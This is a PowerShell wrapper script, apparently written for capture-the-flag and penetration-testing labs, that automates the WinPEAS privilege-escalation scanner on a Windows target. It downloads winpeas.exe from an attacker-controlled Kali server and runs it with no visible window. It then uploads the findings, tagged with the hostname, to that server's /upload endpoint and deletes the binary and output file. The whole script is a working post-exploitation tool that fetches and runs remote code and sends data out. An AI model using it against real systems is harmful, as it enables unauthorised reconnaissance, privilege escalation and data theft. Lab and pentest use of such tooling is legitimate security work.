# ParsingPeas Wrapper Script (PowerShell)
# Runs winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
# Compatible with PowerShell 2.0+

# Server URL will be replaced by receiver.py
$ServerUrl = "KALI_SERVER_URL"

$ErrorActionPreference = "Stop"

$SessionId = "scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$PID"
$Hostname = $env:COMPUTERNAME
if (-not $Hostname) { $Hostname = "unknown" }
$TmpOutput = "$env:TEMP\.winpeas_$(Get-Date -Format 'yyyyMMdd_HHmmss').tmp"

Write-Host "[*] ParsingPeas - Automated Privilege Escalation Scanner" -ForegroundColor Cyan
Write-Host "[*] Session ID: $SessionId" -ForegroundColor Cyan
Write-Host "[*] Hostname: $Hostname" -ForegroundColor Cyan
Write-Host "[*] Server: $ServerUrl" -ForegroundColor Cyan
Write-Host ""

$ScanType = "winpeas"
Write-Host "[*] Detected: Windows system" -ForegroundColor Yellow
$ScriptEndpoint = "$ServerUrl/get-winpeas"
$ScriptPath = "$env:TEMP\winpeas.exe"

Write-Host "[*] Downloading $ScanType from Kali host..." -ForegroundColor Yellow

# Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
try {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
    $WebClient.Dispose()
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $ScriptPath) -or (Get-Item $ScriptPath).Length -eq 0) {
    Write-Host "[!] Error: Script download failed or empty" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Downloaded successfully" -ForegroundColor Green

Write-Host "[*] Running winpeas (this may take 2-5 minutes)..." -ForegroundColor Yellow
Write-Host "[*] Output is being saved to file..." -ForegroundColor Yellow
Write-Host ""

# Run winpeas and capture output with progress
try {
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = $ScriptPath
    $ProcessInfo.RedirectStandardOutput = $true
    $ProcessInfo.RedirectStandardError = $true
    $ProcessInfo.UseShellExecute = $false
    $ProcessInfo.CreateNoWindow = $true
    
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessInfo
    
    $Process.Start() | Out-Null
    Write-Host "[*] Winpeas running (PID: $($Process.Id))..." -ForegroundColor Yellow
    
    # Start async reading to prevent buffer deadlock
    $OutputBuilder = New-Object System.Text.StringBuilder
    $ErrorBuilder = New-Object System.Text.StringBuilder
    
    $OutputEventHandler = {
        if ($EventArgs.Data -ne $null) {
            [void]$Event.MessageData.AppendLine($EventArgs.Data)
        }
    }
    
    $OutputEvent = Register-ObjectEvent -InputObject $Process `
        -EventName OutputDataReceived `
        -Action $OutputEventHandler `
        -MessageData $OutputBuilder
    
    $ErrorEvent = Register-ObjectEvent -InputObject $Process `
        -EventName ErrorDataReceived `
        -Action $OutputEventHandler `
        -MessageData $ErrorBuilder
    
    $Process.BeginOutputReadLine()
    $Process.BeginErrorReadLine()
    
    # Show progress while winpeas is running
    $StartTime = Get-Date
    while (-not $Process.HasExited) {
        $Elapsed = [Math]::Round(((Get-Date) - $StartTime).TotalSeconds)
        $Minutes = [Math]::Floor($Elapsed / 60)
        $Seconds = $Elapsed % 60
        
        # Estimate progress (winpeas typically takes 1-3 minutes)
        $EstimatedDuration = 120  # seconds
        $ProgressPercent = [Math]::Min(95, [int](($Elapsed / $EstimatedDuration) * 100))
        
        $ProgressBar = "[" + ("=" * [int]($ProgressPercent / 5)) + (" " * (20 - [int]($ProgressPercent / 5))) + "]"
        Write-Host "`r[*] Progress: $ProgressBar $ProgressPercent% | Elapsed: $Minutes`:$($Seconds.ToString('00'))" -NoNewline -ForegroundColor Cyan
        
        Start-Sleep -Milliseconds 500
    }
    
    $Process.WaitForExit()
    $ExitCode = $Process.ExitCode
    
    # Cleanup events
    Unregister-Event -SourceIdentifier $OutputEvent.Name
    Unregister-Event -SourceIdentifier $ErrorEvent.Name
    Remove-Job -Id $OutputEvent.Id -Force
    Remove-Job -Id $ErrorEvent.Id -Force
    
    Write-Host "`r[+] Progress: [====================] 100% | Complete!" -NoNewline -ForegroundColor Green
    Write-Host ""
    Write-Host ""
    
    # Combine output and errors
    $Output = $OutputBuilder.ToString()
    $ErrorOutput = $ErrorBuilder.ToString()
    
    $FullOutput = $Output
    if ($ErrorOutput) {
        $FullOutput += "`n`n=== STDERR ===`n" + $ErrorOutput
    }
    
    # Save to temp file
    [System.IO.File]::WriteAllText($TmpOutput, $FullOutput)
    
    Write-Host "[+] Winpeas completed with exit code: $ExitCode" -ForegroundColor Green
    
} catch {
    Write-Host "[!] Error running winpeas: $_" -ForegroundColor Red
    Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Check if output was generated
if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
    Write-Host "[!] Error: No output generated" -ForegroundColor Red
    exit 1
}

$OutputSize = (Get-Item $TmpOutput).Length
Write-Host "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" -ForegroundColor Green
Write-Host ""
Write-Host "[*] Last 10 lines of output:" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Yellow
Get-Content $TmpOutput -Tail 10 | ForEach-Object { Write-Host $_ }
Write-Host "----------------------------------------" -ForegroundColor Yellow
Write-Host ""

# Test connection before upload
Write-Host "[*] Testing connection to Kali host..." -ForegroundColor Yellow
try {
    $TestClient = New-Object System.Net.WebClient
    $TestResponse = $TestClient.DownloadString("$ServerUrl/health")
    $TestClient.Dispose()
    Write-Host "[+] Connection test successful" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Cannot reach server at $ServerUrl" -ForegroundColor Yellow
    Write-Host "[!] Error: $_" -ForegroundColor Yellow
    Write-Host "[*] Will attempt upload anyway..." -ForegroundColor Yellow
}

Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
Write-Host "[*] Upload endpoint: $ServerUrl/upload" -ForegroundColor Cyan
Write-Host "[*] File to upload: $TmpOutput ($([Math]::Round($OutputSize / 1KB, 2)) KB)" -ForegroundColor Cyan
Write-Host ""

# Send to Kali with retry logic and progress bar
$MaxRetries = 3
$RetryCount = 0
$Success = $false

while ($RetryCount -lt $MaxRetries -and -not $Success) {
    Write-Host "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" -ForegroundColor Yellow
    
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("X-Session-ID", $SessionId)
        $WebClient.Headers.Add("X-Hostname", $Hostname)
        $WebClient.Headers.Add("X-Scan-Type", $ScanType)
        $WebClient.Headers.Add("Content-Type", "text/plain")
        
        Write-Host "[*] Reading file bytes..." -ForegroundColor Cyan
        $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
        Write-Host "[+] Read $($FileBytes.Length) bytes" -ForegroundColor Green
        
        Write-Host "[*] Uploading to $ServerUrl/upload ..." -ForegroundColor Cyan
        
        # Note: UploadProgressChanged may not work in all PowerShell versions
        # So we do a simple synchronous upload
        $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
        $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
        
        Write-Host "[+] Upload complete!" -ForegroundColor Green
        Write-Host "[+] Transfer successful!" -ForegroundColor Green
        Write-Host "[*] Server response: $ResponseText" -ForegroundColor Cyan
        
        # Try to extract report URL from response
        try {
            # Simple regex to extract report_url from JSON (no ConvertFrom-Json in PS 2.0)
            if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                $ReportUrl = $matches[1]
                Write-Host "[+] View report at: $ServerUrl$ReportUrl" -ForegroundColor Green
            }
        } catch {
            # Ignore parse errors
        }
        
        $WebClient.Dispose()
        $Success = $true
        
    } catch {
        $RetryCount++
        Write-Host "[!] Transfer failed" -ForegroundColor Red
        Write-Host "[!] Error: $_" -ForegroundColor Red
        Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
        if ($_.Exception.InnerException) {
            Write-Host "[!] Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
        }
        
        if ($RetryCount -lt $MaxRetries) {
            Write-Host "[*] Retrying in 2 seconds..." -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
    }
}

Write-Host ""
if ($Success) {
    Write-Host "[+] Cleaning up..." -ForegroundColor Green
    Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $TmpOutput -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Done!" -ForegroundColor Green
    exit 0
} else {
    Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
    Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
    Write-Host "[*] You can manually upload with:" -ForegroundColor Yellow
    Write-Host "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' $ServerUrl/upload" -ForegroundColor Yellow
    exit 1
}
